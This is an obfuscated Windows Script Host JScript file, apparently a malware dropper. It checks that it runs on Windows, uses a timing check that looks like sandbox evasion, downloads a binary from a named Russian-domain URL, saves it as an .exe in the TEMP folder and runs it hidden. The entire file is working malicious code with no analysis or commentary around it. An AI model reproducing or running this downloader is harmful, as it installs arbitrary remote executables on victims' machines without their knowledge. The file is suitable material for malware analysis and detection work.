var _GU = false;
var _X = "CreateObject";
var _T = function _R() {return WScript[_X]("WScript"+".Shell");}(), _WE = 11;
var _U = "MSXML2.XMLHTTP";
var _H = 2123213;
var _TH = 0;
function _N(_V0){_T["Run"](_V0, _TH, _TH);};
function _II(){return _U + "";};
function _FH(_DN, _K){_TH = _TH * 1; return _DN - _K;};
function _B(){return _X;};
/*@cc_on
  @if (@_win32 || @_win64)
    _GU = true;
  @end
@*/
if (_GU)
{
var _A = "";
function _YG(){return 22;};
var _U0 = 0; var _AD = 0;
function _I()
{
var _I1 = new this["Date"]();
var _E = _I1["getUTCMilliseconds"]();
WScript["Sleep"](_YG());
var _I1 = new this["Date"]();
var _I0 = _I1["getUTCMilliseconds"]();
WScript["Sleep"](_YG());
var _I1 = new this["Date"]();
var _Z = _I1["getUTCMilliseconds"]();
var _U0 = "_QP";
_U0 = _FH(_I0, _E);
var _AD = "_QD";
_AD = _FH(_Z, _I0);
_A = "open";
return _FH(_U0, _AD);
}
var _L = false;
var _YN = false;
for (var _TT = _TH; _TT < _YG() * 1; _TT++){if (_I() != _TH){
_L = true; 
_AD = "31" + 11 * _U0 + _AD; 
_YN = true; 
break;
}}
function _KJ() {return ((_L == true) && (_L == _YN)) ? 1 : _TH;};
if (_L && _KJ() && _YN){
function _O() {return _T["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "IOYktwh1Q6ME.ex" + "e";};
 _HC = _II();
 _IJ = WScript[_X](_HC);
 var _IF = 1;
 while (_IF){
try {
	if (_IF == 1)
	{
		_IJ[_A]("GET", "http://ru-optovik.ru/j9ssl", false);
		_IJ["send"]();
		_NY = "Sleep";
	}
	WScript[_NY](_YG() + 120); 
	if (_IJ["readystate"] < 2 * 2) continue;
	_IF = _TH;
	function _V(_A0) {var _SW = (1, 2, 3, 4, 5, _A0); return _SW;};
	_M = WScript[_B()]("ADODB.Stream");
	_HC = _M;
	_HC[_A]();
	_HC["type"] = _V(1);
	_HC["write"](_IJ["ResponseBody"]);
	_M["position"] = _V(_TH);
	_HC["Save" + "ToFile"](_O(), 2);
	_M["cl"+"ose"]();
	_WX = _O();
	_N(_WX);
} catch(_EP){};
}
}
}

